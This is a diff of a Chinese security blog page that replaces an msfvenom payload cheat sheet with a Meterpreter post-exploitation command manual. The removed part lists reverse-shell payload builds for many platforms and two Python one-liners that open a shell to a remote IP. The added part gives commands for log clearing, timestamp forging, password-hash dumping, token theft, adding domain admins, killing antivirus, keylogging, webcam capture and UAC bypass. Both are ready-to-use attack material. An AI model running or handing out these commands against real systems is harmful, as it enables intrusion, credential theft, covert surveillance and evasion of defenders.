@@ -17,8 +17,11 @@ var _hmt = _hmt || [];
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="msfvenom生成payload, ssooking&#39;s blog">
-    <meta name="description" content="msfvenom重要参数查看payloads: msfvenom --list payloads查看支持的文件格式：msfvenom --help-formats查看payload所需参数：msfvenom -p xxx --payload">
+    <meta name="keywords" content="Meterpreter后渗透命令手册, ssooking&#39;s blog">
+    <meta name="description" content="原文：https://xz.aliyun.com/t/2536
+基本命令sessions    #sessions –h 查看帮助
+sessions -i &amp;lt;ID值&gt;  #进入会话   -k  杀死会话
+background  #将当">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -26,7 +29,7 @@ var _hmt = _hmt || [];
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>msfvenom生成payload | ssooking&#39;s blog</title>
+    <title>Meterpreter后渗透命令手册 | ssooking&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -261,13 +264,13 @@ var _hmt = _hmt || [];
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        msfvenom生成payload
+                        Meterpreter后渗透命令手册
                     </div>
                 </div>
             </div>
@@ -376,121 +379,156 @@ var _hmt = _hmt || [];
     <div class="card">
         <div class="card-content article-info">
             
-            <div class="article-tag">
-                
-                <a href="/tags/metasploit/" target="_blank">
-                    <span class="chip bg-color">metasploit</span>
-                </a>
-                
-                <a href="/tags/RAT/" target="_blank">
-                    <span class="chip bg-color">RAT</span>
-                </a>
-                
-                <a href="/tags/木马后门/" target="_blank">
-                    <span class="chip bg-color">木马后门</span>
-                </a>
-                
-            </div>
-            
             <div class="post-info">
-                
-                <span class="post-cate">
-                    <i class="fa fa-bookmark fa-fw icon-category"></i>
-                    
-                    <a href="/categories/攻防渗透/" class="post-category" target="_blank">
-                        攻防渗透
-                    </a>
-                    
-                    <a href="/categories/攻防渗透/神兵利器/" class="post-category" target="_blank">
-                        神兵利器
-                    </a>
-                    
-                </span>
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2016-11-15
+                    <i class="fa fa-clock-o fa-fw"></i>2018-12-28
                 </span>
             </div>
         </div>
         <hr>
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="msfvenom重要参数"><a href="#msfvenom重要参数" class="headerlink" title="msfvenom重要参数"></a>msfvenom重要参数</h1><p>查看payloads: <code>msfvenom --list payloads</code><br>查看支持的文件格式：<code>msfvenom --help-formats</code><br>查看<code>payload</code>所需参数：<code>msfvenom -p xxx --payload-options</code></p>
-<p>编码参数</p>
-<pre class=" language-bash"><code class="language-bash">-e x86/shikata_ga_nai -i 5 -b <span class="token string">"\x00"</span> //使用shikata_ga_nai编码器编码5次并去除空字符
+                <p>原文：<a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a></p>
+<h1 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h1><pre class=" language-bash"><code class="language-bash">sessions    <span class="token comment" spellcheck="true">#sessions –h 查看帮助</span>
+sessions -i <span class="token operator">&lt;</span>ID值<span class="token operator">></span>  <span class="token comment" spellcheck="true">#进入会话   -k  杀死会话</span>
+background  <span class="token comment" spellcheck="true">#将当前会话放置后台</span>
+run  <span class="token comment" spellcheck="true">#执行已有的模块，输入run后按两下tab，列出已有的脚本</span>
+info <span class="token comment" spellcheck="true">#查看已有模块信息</span>
+getuid <span class="token comment" spellcheck="true"># 查看权限 </span>
+getpid <span class="token comment" spellcheck="true"># 获取当前进程的pid</span>
+sysinfo <span class="token comment" spellcheck="true"># 查看目标机系统信息</span>
+<span class="token function">ps</span> <span class="token comment" spellcheck="true"># 查看当前活跃进程    kill &lt;PID值> 杀死进程</span>
+idletime <span class="token comment" spellcheck="true">#查看目标机闲置时间</span>
+<span class="token function">reboot</span> / <span class="token function">shutdown</span>   <span class="token comment" spellcheck="true">#重启/关机</span>
+shell <span class="token comment" spellcheck="true">#进入目标机cmd shell</span>
 </code></pre>
-<h1 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h1><pre class=" language-bash"><code class="language-bash">windows/shell_bind_tcp
-windows/meterpreter/bind_tcp
-windows/meterpreter/reverse_tcp
-windows/x64/meterpreter/reverse_tcp
-linux/x86/shell_bind_tcp
-linux/x86/meterpreter_reverse_tcp
+<h3 id="migrate进程迁移"><a href="#migrate进程迁移" class="headerlink" title="migrate进程迁移"></a>migrate进程迁移</h3><pre><code>getpid    # 获取当前进程的pid
+ps   # 查看当前活跃进程
+migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中
+kill &lt;pid值&gt;   #杀死进程
+</code></pre><h3 id="uictl开关键盘-鼠标"><a href="#uictl开关键盘-鼠标" class="headerlink" title="uictl开关键盘/鼠标"></a>uictl开关键盘/鼠标</h3><pre class=" language-bash"><code class="language-bash">uictl <span class="token punctuation">[</span>enable/disable<span class="token punctuation">]</span> <span class="token punctuation">[</span>keyboard/mouse/all<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#开启或禁止键盘/鼠标</span>
+uictl disable mouse  <span class="token comment" spellcheck="true">#禁用鼠标</span>
+uictl disable keyboard  <span class="token comment" spellcheck="true">#禁用键盘</span>
 </code></pre>
-<h2 id="System-Payloads"><a href="#System-Payloads" class="headerlink" title="System Payloads"></a>System Payloads</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f elf <span class="token operator">></span> shell.elf
+<h3 id="webcam摄像头命令"><a href="#webcam摄像头命令" class="headerlink" title="webcam摄像头命令"></a>webcam摄像头命令</h3><pre class=" language-bash"><code class="language-bash">webcam_list  <span class="token comment" spellcheck="true">#查看摄像头</span>
+webcam_snap   <span class="token comment" spellcheck="true">#通过摄像头拍照</span>
+webcam_stream   <span class="token comment" spellcheck="true">#通过摄像头开启视频</span>
 </code></pre>
-<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>messagebox Test</p>
-<pre class=" language-bash"><code class="language-bash">msfvenom -a x86 -p windows/messagebox TEXT<span class="token operator">=</span><span class="token string">"hello, it is a test"</span>
+<h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><pre class=" language-bash"><code class="language-bash">getwd 或者pwd <span class="token comment" spellcheck="true"># 查看当前工作目录  </span>
+ls、cd
+search -f *pass*       <span class="token comment" spellcheck="true"># 搜索文件  -h查看帮助</span>
+<span class="token function">cat</span> c:\\lltest\\lltestpasswd.txt  <span class="token comment" spellcheck="true"># 查看文件内容</span>
+upload /tmp/hack.txt C:\\lltest  <span class="token comment" spellcheck="true"># 上传文件到目标机上</span>
+download c:\\lltest\\lltestpasswd.txt /tmp/ <span class="token comment" spellcheck="true"># 下载文件到本机上</span>
+edit c:\\1.txt <span class="token comment" spellcheck="true">#编辑或创建文件  没有的话，会新建文件</span>
+<span class="token function">rm</span> C:\\lltest\\hack.txt
+<span class="token function">mkdir</span> lltest2  <span class="token comment" spellcheck="true">#只能在当前目录下创建文件夹</span>
+<span class="token function">rmdir</span> lltest2  <span class="token comment" spellcheck="true">#只能删除当前目录下文件夹</span>
+getlwd   或者 lpwd   <span class="token comment" spellcheck="true">#操作攻击者主机 查看当前目录</span>
+lcd /tmp   <span class="token comment" spellcheck="true">#操作攻击者主机 切换目录</span>
 </code></pre>
-<p>windows下生成32位/64位payload时需要注意。</p>
-<pre class=" language-bash"><code class="language-bash">msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
+<h3 id="伪造文件时间戳"><a href="#伪造文件时间戳" class="headerlink" title="伪造文件时间戳"></a>伪造文件时间戳</h3><pre><code>timestomp C:// -h   #查看帮助
+timestomp -v C://2.txt   #查看时间戳
+timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
+</code></pre><h3 id="execute执行文件"><a href="#execute执行文件" class="headerlink" title="execute执行文件"></a>execute执行文件</h3><pre class=" language-bash"><code class="language-bash">execute <span class="token comment" spellcheck="true">#在目标机中执行文件</span>
+execute -H -i -f cmd.exe <span class="token comment" spellcheck="true"># 创建新进程cmd.exe，-H不可见，-i交互</span>
 </code></pre>
-<p>以<code>windows/meterpreter/reverse_tcp</code>为例，该payload默认为32位，也可使用<code>-a x86</code>选项指定。</p>
-<p>如果要生成64位，则payload为<code>windows/x64/meterpreter/reverse_tcp</code>。</p>
-<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>nc正向连接</p>
-<pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_hidden_bind_tcp rhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>8956 -f exe<span class="token operator">></span> 1.exe      
+<h3 id="clearav清除日志"><a href="#clearav清除日志" class="headerlink" title="clearav清除日志"></a>clearav清除日志</h3><pre class=" language-bash"><code class="language-bash">clearav  <span class="token comment" spellcheck="true">#清除windows中的应用程序日志、系统日志、安全日志</span>
 </code></pre>
-<p> nc反向连接，监听</p>
-<pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp lhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>888 -f exe<span class="token operator">></span> 1.exe
+<h1 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h1><h3 id="基本网络命令"><a href="#基本网络命令" class="headerlink" title="基本网络命令"></a>基本网络命令</h3><pre class=" language-bash"><code class="language-bash">ipconfig/ifconfig
+<span class="token function">netstat</span> –ano
+arp
+getproxy   <span class="token comment" spellcheck="true">#查看代理信息</span>
+route   <span class="token comment" spellcheck="true">#查看路由</span>
 </code></pre>
-<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho <span class="token operator">></span> shell.macho
+<h3 id="portfwd端口转发"><a href="#portfwd端口转发" class="headerlink" title="portfwd端口转发"></a>portfwd端口转发</h3><pre class=" language-bash"><code class="language-bash">portfwd add -l 6666 -p 3389 -r 127.0.0.1 <span class="token comment" spellcheck="true">#将目标机的3389端口转发到本地6666端口</span>
 </code></pre>
-<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><pre class=" language-bash"><code class="language-bash">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.apk
+<h3 id="添加路由转发"><a href="#添加路由转发" class="headerlink" title="添加路由转发"></a>添加路由转发</h3><pre><code>run autoroute –h #查看帮助
+run autoroute -s 192.168.159.0/24  #添加到目标环境网络
+run autoroute –p  #查看添加的路由
+</code></pre><p>然后可以利用arp_scanner、portscan等进行扫描</p>
+<pre class=" language-bash"><code class="language-bash">run post/windows/gather/arp_scanner RHOSTS<span class="token operator">=</span>192.168.159.0/24
+run auxiliary/scanner/portscan/tcp RHOSTS<span class="token operator">=</span>192.168.159.144 PORTS<span class="token operator">=</span>3389
 </code></pre>
-<h2 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p php/meterpreter_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.php
-<span class="token function">cat</span> shell.php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token string">'&lt;?php '</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span> <span class="token operator">></span> shell.php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">>></span> shell.php
+<h3 id="Socks4a代理"><a href="#Socks4a代理" class="headerlink" title="Socks4a代理"></a>Socks4a代理</h3><p>autoroute添加完路由后，还可以利用msf自带的sock4a模块进行Socks4a代理</p>
+<pre class=" language-bash"><code class="language-bash">msf<span class="token operator">></span> use auxiliary/server/socks4a 
+msf <span class="token operator">></span> <span class="token keyword">set</span> srvhost 127.0.0.1
+msf <span class="token operator">></span> <span class="token keyword">set</span> srvport 1080
+msf <span class="token operator">></span> run
 </code></pre>
-<h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f asp <span class="token operator">></span> shell.asp
+<p>然后vi /etc/proxychains.conf #添加 socks4 127.0.0.1 1080<br>最后proxychains 使用Socks4a代理访问</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>信息收集的脚本位于：</p>
+<pre class=" language-bash"><code class="language-bash">/usr/share/metasploit-framework/modules/post/windows/gather
+/usr/share/metasploit-framework/modules/post/linux/gather
 </code></pre>
-<h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.jsp
+<p>信息收集的脚本较多，仅列几个常用的：</p>
+<pre class=" language-bash"><code class="language-bash">run post/windows/gather/checkvm <span class="token comment" spellcheck="true">#是否虚拟机</span>
+run post/linux/gather/checkvm <span class="token comment" spellcheck="true">#是否虚拟机</span>
+run post/windows/gather/forensics/enum_drives <span class="token comment" spellcheck="true">#查看分区</span>
+run post/windows/gather/enum_applications <span class="token comment" spellcheck="true">#获取安装软件信息</span>
+run post/windows/gather/dumplinks   <span class="token comment" spellcheck="true">#获取最近的文件操作</span>
+run post/windows/gather/enum_ie  <span class="token comment" spellcheck="true">#获取IE缓存</span>
+run post/windows/gather/enum_chrome   <span class="token comment" spellcheck="true">#获取Chrome缓存</span>
+run post/windows/gather/enum_patches  <span class="token comment" spellcheck="true">#补丁信息</span>
+run post/windows/gather/enum_domain  <span class="token comment" spellcheck="true">#查找域控</span>
 </code></pre>
-<h3 id="war"><a href="#war" class="headerlink" title="war"></a>war</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f war <span class="token operator">></span> shell.war
-</code></pre>
-<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_python LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.py
-msfvenom -a python -p python/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.py
-</code></pre>
-<p>正向shell</p>
-<pre class=" language-python"><code class="language-python">python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.176.1",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>
-
-python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('172.16.176.1',9999))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span>
-</code></pre>
-<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_bash LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.sh
-</code></pre>
-<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_perl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.pl
-</code></pre>
-<h1 id="MSF监听"><a href="#MSF监听" class="headerlink" title="MSF监听"></a>MSF监听</h1><pre class=" language-bash"><code class="language-bash">use exploit/multi/handler
-<span class="token keyword">set</span> PAYLOAD <span class="token operator">&lt;</span>Payload name<span class="token operator">></span>
-<span class="token keyword">set</span> RHOST <span class="token operator">&lt;</span>RHOST value<span class="token operator">></span>
-<span class="token keyword">set</span> RPORT <span class="token operator">&lt;</span>RPORT value<span class="token operator">></span>
-<span class="token keyword">set</span> LHOST <span class="token operator">&lt;</span>LHOST value<span class="token operator">></span>
-<span class="token keyword">set</span> LPORT <span class="token operator">&lt;</span>LPORT value<span class="token operator">></span>
-<span class="token keyword">set</span> ExitOnSession <span class="token boolean">false</span>
-exploit -j -z
-</code></pre>
-<p>其他设置</p>
-<p><code>AutoRunScript</code>：自动执行脚本<br>如：自动执行<code>post/windows/manage/migrate</code> 模块注入其他进程</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> AutoRunScript post/windows/manage/migrate
-</code></pre>
-<p>自动注入进程</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> prependmigrate <span class="token boolean">true</span>
-<span class="token keyword">set</span> prependmigrateProc svchost.exe
-</code></pre>
-<p>辅助配置</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> exitonsession <span class="token boolean">false</span> //可以让建立监听的端口继续保持侦听，可以接受多个session
-<span class="token keyword">set</span> stagerverifysslcert <span class="token boolean">false</span> //防止获取shell的时候出现的SSL_accept错误
-</code></pre>
+<p>在windows主机上使用meterpreter进行提权操作：</p>
+<p>​           meterpreter &gt; use priv</p>
+<p>​           meterpreter &gt; getsystem</p>
+<p>从一个给定的进程ID中窃取一个域管理员组令牌，添加一个域账户，并把域账户添加到域管理员组中：</p>
+<p>​          meterpreter &gt; ps</p>
+<p>​          meterpreter &gt; steal_token 1784</p>
+<p>​          meterpreter &gt; shell</p>
+<p>​          C:\windows\system32&gt;net user metasploit password /ADD /DOMAIN</p>
+<p>​          C:\windows\system32&gt;net group “Domain Admins” metasploit /ADD /DOMAIN</p>
+<p>​          C:\windows\system32&gt;net localgroup administrators 用户名 /add 把“用户”添加到管理员中</p>
+<p>从SAM数据库中导出密码的哈希值：</p>
+<p>​         meterpreter &gt; use priv4 </p>
+<p>​         meterpreter &gt; getsystem</p>
+<p>​         meterpreter &gt; hashdump</p>
+<p>注意：在windows 2008 中，如果getsystem命令和hashdump命令抛出异常情况时，你需要迁移到一个以SYSTEM系统权限运行的进程中。</p>
+<p>​        自动迁移到一个独立进程：</p>
+<p>​        meterpreter &gt; run migrate</p>
+<p>通过meterpreter的killav脚本来杀死目标主机运行的杀毒软件：</p>
+<p>​        meterpreter &gt; run killav</p>
+<p>针对一个特定的进程捕获目标主机上的键盘记录：</p>
+<p>​        meterpreter &gt; ps</p>
+<p>​        meterpreter &gt; migrate 1436</p>
+<p>​        meterpreter &gt;keyscan_start</p>
+<p>​        meterpreter &gt;keyscan_dump</p>
+<p>​        meterpreter &gt;keyscan_stop</p>
+<p>键盘记录的另一种方法：</p>
+<p>​        meterpreter &gt;run post/windows/capture/keylog_recorder</p>
+<p>​        记录完按ctrl+c结束</p>
+<p>使用匿名方式来假冒管理员：</p>
+<p>​        meterpreter &gt;use incognito</p>
+<p>​        meterpreter &gt;list_tokens -u</p>
+<p>​        meterpreter &gt;use priv</p>
+<p>​        meterpreter &gt;getsystem</p>
+<p>​        meterpreter &gt;list_tokens -u</p>
+<p>​        meterpreter &gt;impersonate_token  IHAZSECURITY\Administrator</p>
+<p>查看目标主机都采用了那些防护措施，列出帮助菜单，关闭防火墙以及其它我们发现的防护措施：</p>
+<p>​        meterpreter &gt;run getcountermeasure</p>
+<p>​        meterpreter &gt;run getcountermeasuer -h</p>
+<p>​        meterpreter &gt;run getcountermeasuer -d -k</p>
+<p>识别被控制的主机是否是一台虚拟机：</p>
+<p>​        meterpreter &gt;run  checkvm</p>
+<p>在一个meterpreter会话界面中使用cmd shell：</p>
+<p>​       meterpreter &gt;shell</p>
+<p>获取目标主机的图形界面（VNC）：</p>
+<p>​       meterpreter &gt;run vnc</p>
+<p>使正在运行的meterpreter界面在后台运行：</p>
+<p>​       meterpreter &gt;background</p>
+<p>绕过windows的用户账户控制（UAC）机制：</p>
+<p>​       meterpreter &gt;run post/windows/escalate/bypassuac</p>
+<p>导出苹果OS-X系统的口令哈希值：</p>
+<p>​       meterpreter &gt;run post/osx/gather/hashdump</p>
+<p>导出liunx系统的口令哈希值：</p>
+<p>​       meterpreter &gt;run post/linux/gather/hashdump</p>
+<p>打开3398远程桌面：</p>
+<p>meterpreter &gt; run getgui -e  </p>
 
             </div>
             <hr>
@@ -629,7 +667,7 @@ exploit -j -z
                     <span class="reprint-tip">转载请注明: </span>
                     <a href="https://ssooking.github.io" class="b-link-green">ssooking's blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/msfvenom-sheng-cheng-payload/" class="b-link-green">msfvenom生成payload</a>
+                    <a href="/meterpreter-hou-shen-tou-ming-ling-shou-ce/" class="b-link-green">Meterpreter后渗透命令手册</a>
                 </p>
             </div>
         </div>
@@ -649,79 +687,66 @@ exploit -j -z
     <div class="row article-row">
         
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">上一篇</div>
+            <div class="article-badge left-badge text-color">本篇</div>
             <div class="card">
-                <a href="/gong-ji-liu-liang-de-qing-xi/">
+                <a href="/meterpreter-hou-shen-tou-ming-ling-shou-ce/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="攻击流量的清洗">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Meterpreter后渗透命令手册">
                         
-                        <span class="card-title">攻击流量的清洗</span>
+                        <span class="card-title">Meterpreter后渗透命令手册</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">前言　　流量清洗是指在全部的网络流量中区分出正常流量和恶意流量，将恶意流量阻断和丢弃，而只将正常的流量交付给服务器。与其他的网络安全检测和防护手段类似，流量清洗也需要考虑漏报率和误报率的问题。通常，漏报率和误报率是一对矛盾，需要通过对检测和</div>
+                    <div class="summary">原文：https://xz.aliyun.com/t/2536
+基本命令sessions    #sessions –h 查看帮助
+sessions -i &lt;ID值>  #进入会话   -k  杀死会话
+background  #将当</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2017-06-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-12-28
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/安全建设/" class="post-category" target="_blank">
-                                    安全建设
-                                </a>
-                            
+                            <i class="fa fa-user fa-fw"></i>
+                            ssooking
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/DDOS/" target="_blank">
-                        <span class="chip bg-color">DDOS</span>
-                    </a>
-                    
-                    <a href="/tags/IDS/" target="_blank">
-                        <span class="chip bg-color">IDS</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
         
         
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">本篇</div>
+            <div class="article-badge right-badge text-color">下一篇</div>
             <div class="card">
-                <a href="/msfvenom-sheng-cheng-payload/">
+                <a href="/kali-rolling-an-zhuang-zhi-hou-de-yi-xie-chang-yong-pei-zhi-zong-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="msfvenom生成payload">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="kali Rolling安装之后的一些常用配置总结">
                         
-                        <span class="card-title">msfvenom生成payload</span>
+                        <span class="card-title">kali Rolling安装之后的一些常用配置总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">msfvenom重要参数查看payloads: msfvenom --list payloads查看支持的文件格式：msfvenom --help-formats查看payload所需参数：msfvenom -p xxx --payload</div>
+                    <div class="summary">添加普通用户
+useradd -m -G sudo,video,audio,cdrom -s /bin/bash ssooking
+
+把某个用户添加到组中: sudo usermod -a 用户名 -G 组名递归更改目录/文件所属用户组： </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2016-11-15
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-11-23
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/攻防渗透/" class="post-category" target="_blank">
-                                    攻防渗透
-                                </a>
-                            
-                            <a href="/categories/攻防渗透/神兵利器/" class="post-category" target="_blank">
+                            <a href="/categories/神兵利器/" class="post-category" target="_blank">
                                     神兵利器
                                 </a>
                             
@@ -729,20 +754,11 @@ exploit -j -z
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/metasploit/" target="_blank">
-                        <span class="chip bg-color">metasploit</span>
-                    </a>
-                    
-                    <a href="/tags/RAT/" target="_blank">
-                        <span class="chip bg-color">RAT</span>
-                    </a>
-                    
-                    <a href="/tags/木马后门/" target="_blank">
-                        <span class="chip bg-color">木马后门</span>
+                    <a href="/tags/kali/" target="_blank">
+                        <span class="chip bg-color">kali</span>
                     </a>
                     
                 </div>
